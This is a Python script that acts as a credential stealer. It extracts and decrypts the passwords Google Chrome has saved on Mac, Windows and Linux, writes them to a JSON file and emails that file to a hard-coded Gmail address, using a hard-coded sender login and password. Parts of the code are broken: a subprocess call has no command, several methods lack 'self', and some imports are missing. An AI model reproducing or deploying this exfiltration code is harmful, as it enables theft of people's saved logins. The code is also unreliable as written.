""" 
    Get unencrypted 'Saved Password' from Google Chrome
    Supported platform: Mac, Linux and Windows
"""
import secretstorage
import json
import platform
import sqlite3
import string
import subprocess
import os
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy

# SMTP
import smtplib, ssl
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email import encoders
from email.utils import formataddr
from email.mime.application import MIMEApplication
from os.path import basename

#
from Cryptodome.Cipher import AES


class ChromeMac:
    def __init__(self):
        my_pass = subprocess.Popen(
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, _ = my_pass.communicate()
        my_pass = stdout.replace(b'\n', b'')

        iterations = 1003
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/"
                       "Google/Chrome/Default/")

    def decrypt_func(self, enc_passwd):
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class ChromeWin:
    
    def __init__(self):
        
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if os.path.exists(win_path.format(chrome=item))
        ]
        self.dbpath = win_path.format(chrome=''.join(win_chrome_ver))
        # self.dbpath = (f"C:\\Users\\{getuser()}\\AppData\\Local\\Google"
        #                "\\Chrome\\User Data\\Default\\")

    def get_master_key():
        
        with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
            local_state = f.read()
            local_state = json.loads(local_state)
    
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        
        return master_key

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_func(self,buff):
        
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(get_master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return "Chrome < 80"
 


class ChromeLinux:
    
    def __init__(self):
        
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        iterations = 1
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

    def decrypt_func(self, enc_passwd):
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class Chrome:
    def __init__(self):
        target_os = platform.system()
        if target_os == 'Darwin':
            self.chrome_os = ChromeMac()
        elif target_os == 'Windows':
            self.chrome_os = ChromeWin()
        elif target_os == 'Linux':
            self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):

        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT action_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():            
            _passwd = self.chrome_os.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            json.dumps(data, indent=4)
        return data

def triggerMail():
    sender_email = "innusali8@gmail.com"
    receiver_email = "innus513.a@gmail.com"
    password = "AdoreEncryption%%"

    message = MIMEMultipart("alternative")
    message["Subject"] = "Password"
    message["From"] =formataddr(('Code Cracker', sender_email))
    message["To"] = receiver_email

    # Create the plain-text and HTML version of your message

    html = """\
    <html>
        <body>
            <p>Hi,<br>
            We got the password <br>
            has a attchment on this mail, Download it.
            </p>
        </body>
    </html>
    """

    target_os = platform.system()
    if target_os == 'Darwin':
        print('*** Darwin ***')
        pathDir='./password.json'
    elif target_os == 'Windows':
        print('*** Windows ***')
        pathDir=f"C:\\Users\\{getuser()}\\AppData\\Local\\password.json"
    elif target_os == 'Linux':
        print('*** Linux ***')
        pathDir='/tmp/password.json'


    part2 = MIMEText(html, "html")
    message.attach(part2)


    attach_file_name = pathDir
    with open(attach_file_name, "rb") as fil:
        part = MIMEApplication(
            fil.read(),
            Name=basename(attach_file_name)
        )


    part['Content-Disposition'] = 'attachment; filename="%s"' % basename(attach_file_name)
    message.attach(part)


    # Create secure connection with server and send email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(
            sender_email, receiver_email, message.as_string()
        )

def main():
    """ Operational Script """
    chrome_pwd = Chrome()
    
    target_os = platform.system()
    
    if target_os == 'Darwin':
        print('*** Darwin ***')
        pathDir='/tmp/password.json'
    elif target_os == 'Windows':
        print('*** Windows ***')
        pathDir=f"C:\\Users\\{getuser()}\\AppData\\Local\\password.json"
    elif target_os == 'Linux':
        print('*** Linux ***')
        pathDir='/tmp/password.json'

    final_password_list = chrome_pwd.get_password(prettyprint=True)

    try:
        with open(pathDir,'w') as f:
            f.write(json.dumps(final_password_list))
            f.close()
    except IOError as e:
        print(e)



if __name__ == '__main__':
    main()
    triggerMail()
